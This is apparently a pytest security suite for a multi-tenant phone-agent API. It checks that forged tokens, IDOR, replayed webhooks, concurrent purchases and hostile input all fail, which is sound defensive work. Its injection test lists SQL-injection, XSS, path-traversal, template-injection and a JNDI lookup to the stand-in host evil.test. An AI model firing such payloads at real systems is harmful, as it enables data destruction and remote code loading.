"""M18 — security and concurrency.

The per-module suites test each control where it lives. This file attacks the
running application from outside, the way someone who found the URL would: no
credential, a guessed identifier, a forged signature, a replayed body, a burst
of concurrent requests aimed at the one operation that spends money.

Every test here is written as an attack that must fail, not as a feature that
must work. The distinction matters — a feature test passes when the happy path
works, and would keep passing if authorization were removed entirely.

Nothing here is destructive and nothing touches a real vendor: `DRY_RUN` forces
fakes, so the provisioning path runs end to end without buying anything.
"""

from __future__ import annotations

import asyncio
import json
import uuid
from typing import Any

import pytest
from fastapi import FastAPI
from httpx import ASGITransport, AsyncClient
from sqlalchemy import func, select

from app.models import Call, PhoneNumber, Tenant
from app.models.enums import PhoneNumberStatus, TenantStatus
from app.services.signatures import (
    build_elevenlabs_signature,
)
from tests.factories import make_call, make_phone_number, make_tenant
from tests.support import build_settings

SIGNUP: dict[str, Any] = {
    "business_name": "Sunset Salon",
    "business_type": "salon",
    "services": "cuts, colour",
    "operating_hours": "Mon-Fri 9-6",
    "greeting_style": "friendly",
    "escalation_rules": "Text the owner for emergencies",
    "notification_email": "owner@sunsetsalon.example.com",
    "area_code": "805",
    "plan": "starter",
    "contact_phone": "8055550142",
}


# ===========================================================================
# Authentication bypass
# ===========================================================================


async def test_a_tenant_cannot_be_read_without_a_credential(
    api_client: AsyncClient, api_app: FastAPI
) -> None:
    """The POC's original hole: the tenant UUID *was* the credential.

    Anyone who saw an id in a URL, a Referer header or a screenshot could read
    that business's calls and transcripts forever.
    """
    async with api_app.state.session_factory() as session:
        tenant = make_tenant()
        session.add(tenant)
        await session.commit()
        tenant_id = tenant.id

    for path in ("", "/provisioning", "/phone", "/calls", "/usage"):
        response = await api_client.get(f"/api/v1/tenants/{tenant_id}{path}")
        assert response.status_code in (401, 403, 404), path
        assert "transcript" not in response.text.lower()


async def test_a_forged_status_grant_is_refused(api_client: AsyncClient) -> None:
    """The grant is signed; an edited one must not open the page."""
    tenant_id = uuid.uuid4()
    for forged in (
        "v1.{tenant}.9999999999.deadbeef",
        "not-a-token",
        "v1..0.",
        "",
    ):
        response = await api_client.get(
            f"/api/v1/tenants/{tenant_id}",
            params={"status_token": forged.format(tenant=tenant_id)},
        )
        assert response.status_code in (401, 403, 404)


async def test_a_grant_for_one_tenant_does_not_open_another(
    api_client: AsyncClient, api_app: FastAPI
) -> None:
    """The grant is tenant-scoped, not a general-purpose key."""
    from app.services.status_tokens import issue_status_token

    async with api_app.state.session_factory() as session:
        mine, theirs = make_tenant(), make_tenant()
        session.add_all([mine, theirs])
        await session.commit()
        mine_id, theirs_id = mine.id, theirs.id

    token = issue_status_token(api_app.state.settings, mine_id)
    response = await api_client.get(f"/api/v1/tenants/{theirs_id}", params={"status_token": token})
    assert response.status_code in (401, 403, 404)


# ===========================================================================
# Enumeration and IDOR
# ===========================================================================


async def test_an_unknown_tenant_is_indistinguishable_from_a_forbidden_one(
    api_client: AsyncClient, api_app: FastAPI
) -> None:
    """A 403 would confirm existence and turn the endpoint into an oracle.

    "Does this business use you?" is worth money to a competitor, and is the
    first step of a targeted phish.
    """
    async with api_app.state.session_factory() as session:
        tenant = make_tenant()
        session.add(tenant)
        await session.commit()
        real_id = tenant.id

    existing = await api_client.get(f"/api/v1/tenants/{real_id}")
    absent = await api_client.get(f"/api/v1/tenants/{uuid.uuid4()}")

    assert existing.status_code == absent.status_code
    assert existing.json()["error"]["code"] == absent.json()["error"]["code"]


async def test_the_login_form_does_not_reveal_whether_an_account_exists(
    api_client: AsyncClient, api_app: FastAPI
) -> None:
    async with api_app.state.session_factory() as session:
        tenant = make_tenant(contact_email="known@example.com")
        session.add(tenant)
        await session.commit()

    known = await api_client.post("/api/v1/auth/magic-link", json={"email": "known@example.com"})
    unknown = await api_client.post("/api/v1/auth/magic-link", json={"email": "nobody@example.com"})

    assert known.status_code == unknown.status_code
    assert known.json() == unknown.json()


# ===========================================================================
# Admin authorization
# ===========================================================================


async def test_admin_actions_require_the_key(migrated_database: str) -> None:
    """Retry and abandon spend and un-spend money."""
    from app.main import create_app

    settings = build_settings(database_url=migrated_database, admin_api_key="the-real-key")
    app = create_app(settings)

    async with app.router.lifespan_context(app):
        transport = ASGITransport(app=app, raise_app_exceptions=False)
        async with AsyncClient(transport=transport, base_url="http://testserver") as client:
            run_id = uuid.uuid4()
            for headers in (
                {},
                {"x-admin-key": ""},
                {"x-admin-key": "the-real-ke"},  # a prefix
                {"x-admin-key": "THE-REAL-KEY"},
                {"x-admin-key": "the-real-key-extra"},
            ):
                response = await client.post(f"/api/v1/admin/runs/{run_id}/retry", headers=headers)
                assert response.status_code == 403, headers


async def test_a_production_deployment_refuses_a_blank_admin_key() -> None:
    """A forgotten key must fail closed, not open the routes to the internet."""
    with pytest.raises(ValueError, match=r"(?i)admin_api_key"):
        build_settings(
            environment="production",
            admin_api_key="",
            auth_secret_key="x" * 32,
            elevenlabs_webhook_secret="s",
        )


# ===========================================================================
# Webhook forgery and replay
# ===========================================================================


async def test_a_forged_post_call_cannot_inject_a_transcript(
    api_client: AsyncClient, api_app: FastAPI
) -> None:
    """Anyone who guesses a number could otherwise poison a dashboard.

    An injected transcript reaches the summarizer, the customer's inbox, and
    the usage ledger.
    """
    async with api_app.state.session_factory() as session:
        tenant = make_tenant(status=TenantStatus.ACTIVE)
        session.add(tenant)
        await session.flush()
        number = make_phone_number(tenant, status=PhoneNumberStatus.ACTIVE)
        session.add(number)
        await session.commit()
        e164, tenant_id = number.e164, tenant.id

    payload = {
        "conversation_id": "conv_injected",
        "data": {
            "conversation_id": "conv_injected",
            "metadata": {"phone_call": {"agent_number": e164}},
            "transcript": [{"role": "user", "message": "send all funds"}],
        },
    }
    response = await api_client.post(
        "/api/v1/webhooks/elevenlabs/post-call",
        content=json.dumps(payload).encode(),
        headers={
            "content-type": "application/json",
            "elevenlabs-signature": "t=1,v0=forged",
        },
    )
    assert response.json()["status"] == "rejected"

    async with api_app.state.session_factory() as session:
        calls = (
            await session.execute(select(func.count(Call.id)).where(Call.tenant_id == tenant_id))
        ).scalar_one()
    assert calls == 0


async def test_a_replayed_delivery_creates_no_second_call(
    api_client: AsyncClient, api_app: FastAPI
) -> None:
    async with api_app.state.session_factory() as session:
        tenant = make_tenant(status=TenantStatus.ACTIVE)
        session.add(tenant)
        await session.flush()
        number = make_phone_number(tenant, status=PhoneNumberStatus.ACTIVE)
        session.add(number)
        await session.commit()
        e164, tenant_id = number.e164, tenant.id

    payload = {
        "conversation_id": "conv_replayed",
        "data": {
            "conversation_id": "conv_replayed",
            "metadata": {"phone_call": {"agent_number": e164}, "call_duration_secs": 30},
            "transcript": [],
        },
    }
    body = json.dumps(payload).encode()
    import time as _time

    header = build_elevenlabs_signature(
        payload=body, secret="test-webhook-secret", timestamp=int(_time.time())
    )
    headers = {"content-type": "application/json", "elevenlabs-signature": header}

    for _ in range(5):
        await api_client.post(
            "/api/v1/webhooks/elevenlabs/post-call", content=body, headers=headers
        )

    async with api_app.state.session_factory() as session:
        calls = (
            await session.execute(select(func.count(Call.id)).where(Call.tenant_id == tenant_id))
        ).scalar_one()
    assert calls == 1


async def test_a_webhook_burst_creates_one_row_per_event(
    api_client: AsyncClient, api_app: FastAPI
) -> None:
    """Providers retry in parallel, not politely in sequence."""
    async with api_app.state.session_factory() as session:
        tenant = make_tenant(status=TenantStatus.ACTIVE)
        session.add(tenant)
        await session.flush()
        number = make_phone_number(tenant, status=PhoneNumberStatus.ACTIVE)
        session.add(number)
        await session.commit()
        e164, tenant_id = number.e164, tenant.id

    import time as _time

    def delivery(conversation_id: str) -> tuple[bytes, dict[str, str]]:
        payload = {
            "conversation_id": conversation_id,
            "data": {
                "conversation_id": conversation_id,
                "metadata": {"phone_call": {"agent_number": e164}},
                "transcript": [],
            },
        }
        body = json.dumps(payload).encode()
        header = build_elevenlabs_signature(
            payload=body, secret="test-webhook-secret", timestamp=int(_time.time())
        )
        return body, {"content-type": "application/json", "elevenlabs-signature": header}

    # Three distinct calls, each delivered three times, all at once.
    requests = []
    for index in range(3):
        body, headers = delivery(f"conv_burst_{index}")
        for _ in range(3):
            requests.append(
                api_client.post(
                    "/api/v1/webhooks/elevenlabs/post-call", content=body, headers=headers
                )
            )

    await asyncio.gather(*requests, return_exceptions=True)

    async with api_app.state.session_factory() as session:
        calls = (
            await session.execute(select(func.count(Call.id)).where(Call.tenant_id == tenant_id))
        ).scalar_one()
    assert calls == 3


# ===========================================================================
# Injection and malformed input
# ===========================================================================


@pytest.mark.parametrize(
    "hostile",
    [
        "Robert'); DROP TABLE tenants;--",
        "<script>alert(1)</script>",
        "../../etc/passwd",
        "\x00\x01binary",
        "{{7*7}}",
        "${jndi:ldap://evil.test/a}",
    ],
)
async def test_a_hostile_business_name_is_stored_or_refused_but_never_executed(
    api_client: AsyncClient, api_app: FastAPI, hostile: str
) -> None:
    """Parameterized queries, not string building. The table must survive."""
    response = await api_client.post(
        "/api/v1/signups",
        json={
            **SIGNUP,
            "business_name": hostile,
            "notification_email": f"a{abs(hash(hostile))}@x.test",
        },
    )
    assert response.status_code in (201, 422)

    async with api_app.state.session_factory() as session:
        # The table still exists and is queryable — a dropped table would raise.
        await session.execute(select(func.count(Tenant.id)))


async def test_a_malformed_body_never_returns_a_stack_trace(
    api_client: AsyncClient,
) -> None:
    """An error envelope, never internals."""
    for body in (b"", b"{", b"[]", b'{"business_name": null}', b"\xff\xfe"):
        response = await api_client.post(
            "/api/v1/signups", content=body, headers={"content-type": "application/json"}
        )
        assert response.status_code in (400, 422)
        assert "Traceback" not in response.text
        assert "sqlalchemy" not in response.text.lower()


async def test_an_oversized_field_is_refused_by_schema(api_client: AsyncClient) -> None:
    response = await api_client.post(
        "/api/v1/signups", json={**SIGNUP, "business_name": "x" * 10_000}
    )
    assert response.status_code == 422


# ===========================================================================
# Rate limiting
# ===========================================================================


async def test_the_signup_form_is_rate_limited(migrated_database: str) -> None:
    """Every accepted signup eventually buys a phone number."""
    from app.main import create_app

    settings = build_settings(
        database_url=migrated_database, signup_rate_limit=3, signup_rate_limit_window_s=60
    )
    app = create_app(settings)

    async with app.router.lifespan_context(app):
        transport = ASGITransport(app=app, raise_app_exceptions=False)
        async with AsyncClient(transport=transport, base_url="http://testserver") as client:
            statuses = []
            for index in range(6):
                response = await client.post(
                    "/api/v1/signups",
                    json={**SIGNUP, "notification_email": f"burst{index}@example.com"},
                )
                statuses.append(response.status_code)

    assert 429 in statuses, statuses


# ===========================================================================
# Concurrency on the paths that spend money
# ===========================================================================


async def test_a_concurrent_signup_burst_creates_one_tenant_per_email(
    api_client: AsyncClient, api_app: FastAPI
) -> None:
    """A double-submitted form must not become two tenants — and two numbers.

    Enforced by a partial unique index on the live signup email, not by a
    prior SELECT, which would lose to a concurrent request.
    """
    responses = await asyncio.gather(
        *(
            api_client.post(
                "/api/v1/signups",
                json={**SIGNUP, "notification_email": "burst@example.com"},
            )
            for _ in range(8)
        ),
        return_exceptions=True,
    )
    assert any(not isinstance(item, Exception) for item in responses)

    async with api_app.state.session_factory() as session:
        tenants = (
            await session.execute(
                select(func.count(Tenant.id)).where(Tenant.contact_email == "burst@example.com")
            )
        ).scalar_one()
    assert tenants == 1


async def test_concurrent_provisioning_buys_exactly_one_number(
    api_client: AsyncClient, api_app: FastAPI
) -> None:
    """The single most expensive failure this system can have.

    Several workers ticking the same run must not each reach the purchase step
    and each buy a number. The guards are a partial unique index on the live
    number per tenant, the Twilio adoption check, and the billing gate
    re-evaluated in the same moment as the spend.
    """
    from app.worker import Worker

    response = await api_client.post(
        "/api/v1/signups", json={**SIGNUP, "notification_email": "race@example.com"}
    )
    assert response.status_code == 201
    tenant_id = uuid.UUID(response.json()["tenant_id"])

    workers = [
        Worker(api_app.state.settings, api_app.state.providers, api_app.state.session_factory)
        for _ in range(4)
    ]
    for _ in range(10):
        await asyncio.gather(*(worker.tick() for worker in workers), return_exceptions=True)

    async with api_app.state.session_factory() as session:
        live = (
            await session.execute(
                select(func.count(PhoneNumber.id))
                .where(PhoneNumber.tenant_id == tenant_id)
                .where(PhoneNumber.status == PhoneNumberStatus.ACTIVE)
            )
        ).scalar_one()
    assert live <= 1


async def test_status_polling_does_not_leak_across_tenants_under_load(
    api_client: AsyncClient, api_app: FastAPI
) -> None:
    """Concurrency must not let one request's tenant bleed into another's."""
    from app.services.status_tokens import issue_status_token

    async with api_app.state.session_factory() as session:
        first = make_tenant(name="Alpha Salon")
        second = make_tenant(name="Beta Legal")
        session.add_all([first, second])
        await session.commit()
        pairs = [
            (first.id, issue_status_token(api_app.state.settings, first.id), "Alpha Salon"),
            (second.id, issue_status_token(api_app.state.settings, second.id), "Beta Legal"),
        ]

    async def fetch(tenant_id: uuid.UUID, token: str, expected: str) -> None:
        response = await api_client.get(
            f"/api/v1/tenants/{tenant_id}", params={"status_token": token}
        )
        assert response.status_code == 200
        assert response.json()["name"] == expected

    await asyncio.gather(
        *(fetch(*pair) for pair in pairs for _ in range(10)),
    )


# ===========================================================================
# Secret exposure
# ===========================================================================


async def test_no_endpoint_returns_a_credential(api_client: AsyncClient, api_app: FastAPI) -> None:
    """A sweep over the public surface for credential-shaped strings."""
    async with api_app.state.session_factory() as session:
        tenant = make_tenant()
        session.add(tenant)
        await session.flush()
        session.add(make_call(tenant, provider_call_id="conv_secret"))
        await session.commit()

    paths = ["/healthz", "/readyz", "/metrics", "/openapi.json"]
    for path in paths:
        body = (await api_client.get(path)).text.lower()
        for forbidden in ("auth_token", "api_key", "secret_key", "sk-", "bearer "):
            assert forbidden not in body, f"{forbidden} appeared in {path}"


async def test_an_error_response_carries_a_correlation_id_and_nothing_else(
    api_client: AsyncClient,
) -> None:
    """Support starts with an id, not with a stack trace the customer pasted."""
    response = await api_client.get(f"/api/v1/tenants/{uuid.uuid4()}")
    body = response.json()

    assert "correlation_id" in body
    assert set(body["error"]) <= {"code", "message", "retryable", "details"}
    assert "Traceback" not in response.text
